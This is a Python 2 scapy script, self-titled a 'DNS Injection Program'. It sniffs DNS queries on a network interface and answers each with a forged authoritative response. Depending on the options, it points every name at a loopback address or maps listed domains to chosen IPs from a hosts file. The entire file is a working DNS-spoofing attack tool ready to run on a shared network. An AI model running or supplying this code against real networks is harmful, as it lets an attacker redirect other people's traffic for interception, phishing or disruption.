from scapy.all import *
import sys

myList = {}
hostfilename = "hostnames"
anyip = 0
local_ip = 0
expression= None
interface = None

def updatehost():
	if(anyip == 1):
		return
	file = open(hostfilename, "r")

	for line in file:
		if(line == '\n'):
			return
		ar =  line.split()
		myList [ar[1]] =  ar[0]
		#print myList


def sniffdns(pkt):
	updatehost()
	if IP in pkt:
		#pkt.show()
		ip_src = pkt[IP].src;
		ip_dst = pkt[IP].dst;
		if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
			if pkt.haslayer(DNSQR):
				#print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"
				#packethostname = pkt[DNSQR].qname.rstrip('.')
				packethostname1 = pkt[DNSQR].qname
				packethostname = packethostname1.rstrip('.')
				#print packethostname
				#print "haskey" , myList.has_key(packethostname)
				if(anyip == 1):
					local_ip = "127.0.0.1"

				elif(myList.has_key(packethostname) == True):
					local_ip = myList[packethostname]
				else:
					local_ip = "127.0.0.2"
					#if(item == 0)
					#print item
				spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst)\
				/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)\
				/DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata=local_ip)\
				/DNSRR(rrname=pkt[DNSQR].qname,rdata=local_ip))
				send(spfResp, verbose=0)
				#spfResp.show()
				print "Spoofed DNS Packet Sent"


print "DNS Injection Program"#, len(sys.argv)
jump = 0
anyip = 1
for index, argv in enumerate(sys.argv):
	if(index == 0):
		continue
	if(jump):
		jump = 0
		continue
	if(argv == "-i"):
		interface = sys.argv[index  + 1]
		#print "interface = ", interface 
		jump = 1
	elif(argv == "-h"):
		hostfilename = sys.argv[index + 1]
		#print "host file = ", hostfilename
		anyip = 0
		jump = 1
	else:
		expression = argv
		print "Exp = ", expression
	#print index, argv

if(expression == None):
	expression = "udp dst port 53"

if(interface == None):
	print "Interface = Default"
	print "final exp = ", expression
	if(anyip == 1):
		print "All DNS Query are tried to be poisoned"
	else:
		print hostfilename, " file is read to get the DNS domain names to be poisoned"
	sniff(filter=expression, prn=sniffdns, store=0)
else:
	print "Interface = ", interface
	print "final exp = ", expression
	if(anyip == 1):
		print "All DNS Query are tried to be poisoned"
	else:
		print hostfilename, " file is read to get the DNS domain names to be poisoned"
	sniff(iface=interface, filter=expression, prn=sniffdns, store=0)


	
#if(hostfilename == None):
#	anyip = 1;
#if(len(sys.argv) == 1):
#	print "Running with default interface and no host parsing or expression"


#sniff(iface=interface, filter=expression, prn=querysniff, store=0)
